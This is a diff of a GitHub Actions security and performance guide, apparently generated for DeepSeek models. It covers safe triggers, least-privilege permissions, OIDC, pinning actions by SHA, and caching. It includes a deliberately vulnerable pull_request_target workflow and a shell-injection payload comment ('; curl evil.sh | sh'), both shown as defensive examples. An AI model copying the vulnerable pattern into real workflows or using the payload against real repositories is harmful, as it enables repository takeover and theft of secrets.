@@ -5,1166 +5,192 @@ targetModels:
   - "DeepSeek R1"
   - "DeepSeek V3 Family"
   - "Future DeepSeek Models"
-version: "1.0.0"
-
-
+name: github-actions
+category: DevOps
+description: GitHub Actions workflows that are fast and not exploitable — trigger safety, OIDC over static keys, pinning, caching, concurrency and reusable workflows.
+license: MIT
+author: Agent.md maintainers
+last-verified: 2026-08-23
+reviewed-by: unreviewed
 ---
+<!-- Generated from models/_canonical by scripts/build-model-variants.js.
+     Edit the canonical source, not this file. Structure adapted for DeepSeek per deep-research.md. -->
 
-# github-actions.md
-
-Version: 1.0.0
-
-Target Models
-
-- DeepSeek V4
-- DeepSeek V3.2
-- DeepSeek R1
-- DeepSeek V3 Family
-- Future DeepSeek Models
-
----
 
 # Purpose
 
-This document defines engineering principles, architectural guidance, operational standards, and best practices for designing, securing, optimizing, and operating Continuous Integration and Continuous Delivery workflows using GitHub Actions.
-
-It applies to
-
-- Backend Services
-- Frontend Applications
-- APIs
-- AI Applications
-- Mobile Backends
-- Monorepositories
-- Microservices
-- Infrastructure Repositories
-- Enterprise Platforms
-
-GitHub Actions is not simply automation.
-
-GitHub Actions is an engineering platform that transforms source code changes into reliable, repeatable, secure, and observable software delivery pipelines.
-
-Automation should eliminate human error.
-
-Not eliminate engineering judgment.
+Rules specific to GitHub Actions. General pipeline design is `DevOps/cicd`; this
+covers the platform's own behaviours — particularly the trigger and permission
+model, which is where its real vulnerabilities live.
 
 ---
 
-# Core Philosophy
+# Triggers decide who can run your secrets
 
-Write Code
+| Trigger | Runs as | Secrets | Safe with untrusted code |
+| --- | --- | --- | --- |
+| `push` | The repository | Yes | n/a |
+| `pull_request` | The **merge** ref, no write token, no secrets for forks | No (forks) | Yes |
+| `pull_request_target` | The **base** ref, with write token and secrets | **Yes** | **No** |
+| `workflow_run` | The repository | Yes | Only with care |
+| `issue_comment` | The repository | Yes | No |
 
-↓
+**`pull_request_target` combined with checking out the pull request head is a
+repository takeover.** It runs untrusted code with your secrets and a write token:
 
-Validate Changes
+```yaml
+# ❌ Never. The fork's code executes with full repository credentials.
+on: pull_request_target
+steps:
+  - uses: actions/checkout@v4
+    with: { ref: ${{ github.event.pull_request.head.sha }} }
+  - run: npm ci && npm test                # arbitrary code from the fork
+```
 
-↓
+Use `pull_request_target` only to do something that does not execute fork code —
+labelling, commenting — and never check out the head ref in it.
 
-Build Artifacts
+Untrusted input reaches you in `github.event.*`: a pull-request title, a branch
+name or an issue body interpolated into a `run:` block is shell injection.
 
-↓
-
-Verify Quality
-
-↓
-
-Secure Supply Chain
-
-↓
-
-Deploy Predictably
-
-↓
-
-Observe Results
-
-↓
-
-Continuously Improve
-
-Every commit should follow the same engineering process.
-
-No exceptions.
+```yaml
+- run: echo "${{ github.event.pull_request.title }}"      # ❌ title: "; curl evil.sh | sh"
+- env: { TITLE: ${{ github.event.pull_request.title }} }  # ✅ via env, quoted
+  run: echo "$TITLE"
+```
 
 ---
 
-# Primary Objective
+# Least privilege, and no static cloud keys
 
-Every GitHub Actions workflow should maximize
+```yaml
+permissions:
+  contents: read          # default for the whole workflow
 
-Reliability
+jobs:
+  deploy:
+    permissions:
+      contents: read
+      id-token: write     # only this job gets OIDC
+```
 
-+
+- Set `permissions` explicitly at the top. The default is broad, and a compromised
+  action inherits it.
+- Grant elevated scopes per **job**, never workflow-wide.
+- Use **OIDC federation** to assume a cloud role rather than storing long-lived
+  keys:
 
-Automation
+```yaml
+- uses: aws-actions/configure-aws-credentials@v4
+  with:
+    role-to-assume: arn:aws:iam::123456789012:role/gha-deploy
+    aws-region: eu-west-1
+```
 
-+
+There is then no static credential to leak, rotate, or find in a log. Scope the
+trust policy to the specific repository **and ref** — a policy trusting
+`repo:org/*` lets any repository in the organisation deploy your production.
 
-Security
-
-+
-
-Reproducibility
-
-+
-
-Maintainability
-
-+
-
-Observability
-
-+
-
-Developer Productivity
-
-+
-
-Operational Excellence
-
-Pipelines should be deterministic.
-
-Every execution should produce predictable results.
+`GITHUB_TOKEN` expires with the job; prefer it over a personal access token. Where
+a PAT is unavoidable, use a fine-grained one scoped to one repository.
 
 ---
 
-# Engineering Principles
+# Pin everything
 
-Always prioritize
+```yaml
+- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683   # v4.2.2
+```
 
-Automation
+A tag is mutable: `@v4` can be repointed by the action's maintainer at any time,
+which is arbitrary code execution in a workflow holding your secrets. Pin by
+commit SHA with the version in a comment, and let Dependabot raise the updates.
 
-↓
-
-Deterministic Builds
-
-↓
-
-Security
-
-↓
-
-Fast Feedback
-
-↓
-
-Incremental Validation
-
-↓
-
-Reusability
-
-↓
-
-Observability
-
-↓
-
-Continuous Improvement
-
-Pipelines should fail early.
-
-Success should be earned automatically.
+Pin runner images to a version (`ubuntu-24.04`) rather than `ubuntu-latest`, which
+moves under you and breaks builds on a schedule you do not control.
 
 ---
 
-# Workflow Lifecycle
+# Make it fast
 
-Developer Commit
+```yaml
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true          # superseded pushes stop wasting runners
+```
 
-↓
+- `concurrency` with `cancel-in-progress` on pull-request workflows; never on
+  deploy workflows, where cancelling mid-deploy leaves a partial rollout.
+- Cache keyed on the lockfile hash, with a restore-key fallback:
 
-Trigger Workflow
+```yaml
+- uses: actions/setup-node@v4
+  with: { node-version: 22, cache: npm }     # built-in, keyed on the lockfile
+```
 
-↓
-
-Validate
-
-↓
-
-Build
-
-↓
-
-Test
-
-↓
-
-Secure
-
-↓
-
-Package
-
-↓
-
-Deploy
-
-↓
-
-Monitor
-
-↓
-
-Improve
+- Use `paths` filters so a documentation change does not run the full test matrix.
+- Shard slow suites across a matrix; `fail-fast: false` when you want every shard's
+  result rather than the first failure.
+- Prefer `npm ci` over `npm install`, and keep `actions/cache` keys off branch
+  names — a loosely keyed cache serves stale dependencies and produces failures
+  that vanish on expiry.
 
 ---
 
-# Stage 1 — Repository Analysis
+# Structure and operations
 
-Understand
-
-Application Architecture
-
-↓
-
-Repository Structure
-
-↓
-
-Technology Stack
-
-↓
-
-Dependencies
-
-↓
-
-Deployment Targets
-
-↓
-
-Branch Strategy
-
-↓
-
-Release Process
-
-↓
-
-Business Requirements
-
-Workflows should reflect software architecture.
+- Extract shared logic into **reusable workflows** (`workflow_call`) or composite
+  actions. Copy-pasted YAML across ten repositories drifts immediately.
+- Use `environment:` for deployments to get required reviewers, wait timers and
+  environment-scoped secrets.
+- Mask anything sensitive (`::add-mask::`) and never `echo` a secret to debug.
+  Workflow logs are readable by anyone with repository read access.
+- Set `timeout-minutes` on every job. The default is six hours, and a hung job
+  holds a runner for all of it.
+- Set `defaults.run.shell: bash` and start scripts with `set -euo pipefail` —
+  otherwise a failing command in the middle of a multi-line `run` is ignored.
 
 ---
 
-# Stage 2 — Workflow Design
+# Anti-patterns
 
-Design
-
-Triggers
-
-↓
-
-Jobs
-
-↓
-
-Dependencies
-
-↓
-
-Parallel Execution
-
-↓
-
-Artifacts
-
-↓
-
-Reusable Components
-
-↓
-
-Permissions
-
-↓
-
-Notifications
-
-Simple workflows are easier to maintain.
+| Anti-pattern | Why it fails | Fix |
+| --- | --- | --- |
+| `pull_request_target` + checkout head | Fork code runs with your secrets | Never combine them |
+| `github.event.*` in a `run:` block | Shell injection from a title or branch name | Pass through `env:` |
+| No `permissions` block | Broad default token inherited by every action | Explicit least privilege |
+| Workflow-wide elevated permissions | Every job holds write access | Per-job scopes |
+| Long-lived cloud keys in secrets | A leak is permanent until noticed | OIDC federation |
+| OIDC trust policy scoped to an org | Any repository can deploy production | Scope to repository and ref |
+| Actions pinned by tag | Mutable; arbitrary code execution | Pin by SHA |
+| `ubuntu-latest` | Changes under you; scheduled breakage | Pin the runner image |
+| No `concurrency` on PR workflows | Superseded runs waste runners | Cancel in progress |
+| `cancel-in-progress` on deploys | Partial rollout left behind | Never on deploys |
+| Cache keyed on branch | Stale dependencies; phantom failures | Key on the lockfile hash |
+| No `paths` filters | Docs changes run the full matrix | Filter by path |
+| No `timeout-minutes` | A hung job holds a runner for six hours | Set a timeout |
+| Multi-line `run` without `pipefail` | Mid-script failures ignored | `set -euo pipefail` |
+| Copy-pasted workflows across repos | Immediate drift | Reusable workflows |
+| Secrets echoed for debugging | Readable by anyone with repo access | Mask; never print |
 
 ---
 
-# Stage 3 — Event Triggers
-
-Configure
-
-Push Events
-
-↓
-
-Pull Requests
-
-↓
-
-Tags
-
-↓
-
-Releases
-
-↓
-
-Schedules
-
-↓
-
-Manual Dispatch
-
-↓
-
-Reusable Calls
-
-↓
-
-Repository Events
-
-Automation begins with predictable triggers.
-
----
-
-# Stage 4 — Build Pipeline
-
-Execute
-
-Dependency Installation
-
-↓
-
-Compilation
-
-↓
-
-Code Generation
-
-↓
-
-Linting
-
-↓
-
-Formatting
-
-↓
-
-Static Analysis
-
-↓
-
-Artifact Creation
-
-↓
-
-Validation
-
-Every build should be reproducible.
-
----
-
-# Stage 5 — Testing
-
-Validate
-
-Unit Tests
-
-↓
-
-Integration Tests
-
-↓
-
-API Tests
-
-↓
-
-UI Tests
-
-↓
-
-Performance Tests
-
-↓
-
-Regression Tests
-
-↓
-
-Smoke Tests
-
-↓
-
-Coverage Analysis
-
-Quality should be verified automatically.
-
----
-
-# Stage 6 — Dependency Management
-
-Manage
-
-Package Versions
-
-↓
-
-Caching
-
-↓
-
-Lock Files
-
-↓
-
-Reproducible Builds
-
-↓
-
-Dependency Updates
-
-↓
-
-License Validation
-
-↓
-
-Compatibility
-
-↓
-
-Supply Chain Integrity
-
-Dependencies should remain predictable.
-
----
-
-# Stage 7 — Security
-
-Protect
-
-Workflow Permissions
-
-↓
-
-Secrets
-
-↓
-
-OIDC Authentication
-
-↓
-
-Dependency Scanning
-
-↓
-
-Secret Scanning
-
-↓
-
-Code Scanning
-
-↓
-
-Artifact Integrity
-
-↓
-
-Compliance
-
-Automation should never weaken security.
-
----
-
-# Stage 8 — Artifact Management
-
-Manage
-
-Build Outputs
-
-↓
-
-Packages
-
-↓
-
-Container Images
-
-↓
-
-Reports
-
-↓
-
-Coverage Results
-
-↓
-
-Logs
-
-↓
-
-Release Assets
-
-↓
-
-Retention Policies
-
-Artifacts should be reproducible.
-
----
-
-# Stage 9 — Deployment
-
-Deploy
-
-Development
-
-↓
-
-Testing
-
-↓
-
-Staging
-
-↓
-
-Production
-
-↓
-
-Approval Gates
-
-↓
-
-Health Validation
-
-↓
-
-Rollback Preparation
-
-↓
-
-Release Verification
-
-Deployments should be predictable.
-
----
-
-# Stage 10 — Environment Management
-
-Separate
-
-Development
-
-↓
-
-Testing
-
-↓
-
-Staging
-
-↓
-
-Production
-
-↓
-
-Secrets
-
-↓
-
-Configuration
-
-↓
-
-Permissions
-
-↓
-
-Approvals
-
-Every environment should remain isolated.
-
----
-
-# Stage 11 — Performance
-
-Optimize
-
-Workflow Duration
-
-↓
-
-Caching
-
-↓
-
-Parallel Jobs
-
-↓
-
-Resource Usage
-
-↓
-
-Incremental Builds
-
-↓
-
-Reusable Workflows
-
-↓
-
-Runner Efficiency
-
-↓
-
-Infrastructure Cost
-
-Fast feedback improves engineering productivity.
-
----
-
-# Stage 12 — Observability
-
-Monitor
-
-Workflow Status
-
-↓
-
-Execution Time
-
-↓
-
-Failure Rates
-
-↓
-
-Deployment Success
-
-↓
-
-Security Alerts
-
-↓
-
-Resource Usage
-
-↓
-
-Build History
-
-↓
-
-Pipeline Health
-
-Automation should explain itself.
-
----
-
-# Stage 13 — Reliability
-
-Ensure
-
-Retry Logic
-
-↓
-
-Failure Recovery
-
-↓
-
-Idempotent Jobs
-
-↓
-
-Graceful Cancellation
-
-↓
-
-Dependency Validation
-
-↓
-
-Rollback Support
-
-↓
-
-Release Consistency
-
-↓
-
-Operational Stability
-
-Reliable automation builds trust.
-
----
-
-# Stage 14 — Scalability
-
-Prepare for
-
-Growing Teams
-
-↓
-
-More Repositories
-
-↓
-
-Larger Pipelines
-
-↓
-
-Monorepositories
-
-↓
-
-Multiple Services
-
-↓
-
-Cloud Expansion
-
-↓
-
-Global Teams
-
-↓
-
-Future Growth
-
-Automation should scale with engineering.
-
----
-
-# Stage 15 — Documentation
-
-Document
-
-Workflow Architecture
-
-↓
-
-Pipeline Stages
-
-↓
-
-Secrets
-
-↓
-
-Permissions
-
-↓
-
-Deployment Strategy
-
-↓
-
-Recovery Procedures
-
-↓
-
-Operational Decisions
-
-↓
-
-Future Evolution
-
-Documentation reduces operational dependency.
-
----
-
-# Stage 16 — Version Management
-
-Maintain
-
-Workflow History
-
-↓
-
-Action Versions
-
-↓
-
-Reusable Workflows
-
-↓
-
-Pipeline Evolution
-
-↓
-
-Release History
-
-↓
-
-Rollback Records
-
-↓
-
-Review History
-
-↓
-
-Compatibility
-
-Workflows should evolve safely.
-
----
-
-# Stage 17 — Review
-
-Review
-
-Pipeline Design
-
-↓
-
-Security
-
-↓
-
-Performance
-
-↓
-
-Maintainability
-
-↓
-
-Reliability
-
-↓
-
-Deployment Strategy
-
-↓
-
-Developer Experience
-
-↓
-
-Business Alignment
-
-Automation deserves engineering review.
-
----
-
-# Stage 18 — Risk Assessment
-
-Evaluate
-
-Secret Exposure
-
-↓
-
-Supply Chain Risks
-
-↓
-
-Workflow Failures
-
-↓
-
-Deployment Failures
-
-↓
-
-Permission Escalation
-
-↓
-
-Configuration Drift
-
-↓
-
-Operational Risks
-
-↓
-
-Business Impact
-
-Automation can amplify mistakes.
-
-Design accordingly.
-
----
-
-# Stage 19 — Continuous Optimization
-
-Continuously improve
-
-Workflow Speed
-
-↓
-
-Security
-
-↓
-
-Caching
-
-↓
-
-Developer Experience
-
-↓
-
-Monitoring
-
-↓
-
-Documentation
-
-↓
-
-Automation
-
-↓
-
-Engineering Maturity
-
-Healthy pipelines improve continuously.
-
----
-
-# Stage 20 — Long-Term Sustainability
-
-Continuously improve
-
-Reliability
-
-↓
-
-Automation
-
-↓
-
-Security
-
-↓
-
-Scalability
-
-↓
-
-Maintainability
-
-↓
-
-Observability
-
-↓
-
-Operational Excellence
-
-↓
-
-Engineering Excellence
-
-Exceptional CI/CD platforms become invisible.
-
----
-
-# GitHub Actions Quality Attributes
-
-Evaluate
-
-Reliability
-
-Automation
-
-Security
-
-Maintainability
-
-Performance
-
-Observability
-
-Scalability
-
-Developer Experience
-
----
-
-# GitHub Actions Questions
-
-Before production ask
-
-Can every workflow execute deterministically?
-
-↓
-
-Can builds be reproduced exactly?
-
-↓
-
-Are secrets fully protected?
-
-↓
-
-Can failed deployments recover safely?
-
-↓
-
-Are permissions minimal?
-
-↓
-
-Can the pipeline scale with the engineering team?
-
-↓
-
-Would experienced DevOps engineers confidently approve this workflow architecture?
-
----
-
-# Severity Levels
-
-Critical
-
-Compromised secrets
-
-Supply chain attacks
-
-Unauthorized deployments
-
-Broken production pipeline
-
-Privilege escalation
-
-Major
-
-Workflow failures
-
-Deployment failures
-
-Broken caching
-
-Failed releases
-
-Configuration drift
-
-Medium
-
-Pipeline optimization
-
-Reusable workflow improvements
-
-Documentation gaps
-
-Performance tuning
-
-Minor
-
-Naming consistency
-
-Workflow organization
-
-Comments
-
-Formatting
-
----
-
-# GitHub Actions Checklist
-
-✓ Repository analyzed
-
-✓ Workflow architecture designed
-
-✓ Triggers configured
-
-✓ Build pipeline implemented
-
-✓ Testing automated
-
-✓ Dependencies managed
-
-✓ Security implemented
-
-✓ Artifacts managed
-
-✓ Deployment configured
-
-✓ Environment isolation established
-
-✓ Performance optimized
-
-✓ Monitoring enabled
-
-✓ Reliability validated
-
-✓ Scalability reviewed
-
-✓ Documentation completed
-
-✓ Version management maintained
-
-✓ Reviews completed
-
-✓ Risks assessed
-
-✓ Continuous optimization practiced
-
-✓ Long-term sustainability protected
-
----
-
-# Anti-Patterns
-
-Avoid
-
-Using broad repository permissions
-
-Storing secrets inside workflows
-
-Using mutable action versions
-
-Ignoring dependency caching
-
-Deploying directly from unverified branches
-
-Combining every responsibility into one workflow
-
-Skipping automated testing
-
-Ignoring failed workflows
-
-Duplicating workflow logic
-
-Manual production deployments without validation
-
-Using untrusted third-party actions
-
-Ignoring supply chain security
-
-Optimizing workflow speed before ensuring correctness
-
----
-
-# Definition of Done
-
-A GitHub Actions platform is considered production-ready when
-
-- Every workflow is deterministic, reproducible, version-controlled, and capable of executing consistently across all supported environments.
-- Pipeline architecture separates validation, testing, security, packaging, deployment, monitoring, and release responsibilities into maintainable, reusable workflows.
-- Build processes generate reproducible artifacts through deterministic dependency management, immutable action versions, verified toolchains, and automated validation.
-- Security protects secrets, credentials, permissions, deployment environments, supply chains, artifacts, and repository integrity through least-privilege principles and continuous verification.
-- Testing automatically validates application correctness, quality, compatibility, performance, regression behavior, and deployment readiness before software reaches production.
-- Deployment workflows support environment isolation, approval gates, progressive delivery, rollback preparation, health validation, and post-deployment verification.
-- Monitoring continuously observes workflow execution, pipeline performance, deployment success, security alerts, infrastructure health, artifact integrity, and operational risks.
-- Documentation preserves workflow architecture, security decisions, deployment strategies, operational procedures, reusable components, and long-term maintenance guidance.
-- Engineering reviews continuously validate automation quality, security posture, maintainability, scalability, observability, and developer productivity.
-- The GitHub Actions platform consistently demonstrates deterministic automation, operational excellence, secure software delivery, engineering discipline, maintainability, and long-term reliability.
-
-Exceptional GitHub Actions platforms rarely become topics of discussion.
-
-Developers commit code with confidence, every change follows an identical engineering process, builds remain reproducible, security checks execute automatically, deployments occur predictably, failures are detected before customers experience them, and software delivery becomes a disciplined engineering system rather than a collection of manual operational tasks.
+# Checklist
+
+- [ ] No workflow combines `pull_request_target` with checking out the head ref
+- [ ] No `github.event` value is interpolated directly into a shell command
+- [ ] `permissions` is declared explicitly and defaults to `contents: read`
+- [ ] Elevated permissions are granted per job
+- [ ] Cloud access uses OIDC, scoped to this repository and ref
+- [ ] No long-lived cloud credentials are stored as secrets
+- [ ] Every third-party action is pinned by commit SHA
+- [ ] Runner images are pinned to a version
+- [ ] Pull-request workflows cancel superseded runs; deploy workflows do not
+- [ ] Dependency caches are keyed on lockfile hashes
+- [ ] Path filters prevent unnecessary matrix runs
+- [ ] Slow suites are sharded across a matrix
+- [ ] Every job sets `timeout-minutes`
+- [ ] Shell steps run with `set -euo pipefail`
+- [ ] Shared logic lives in reusable workflows, not copied YAML
+- [ ] Deployments use environments with required reviewers
+- [ ] No secret is printed or logged
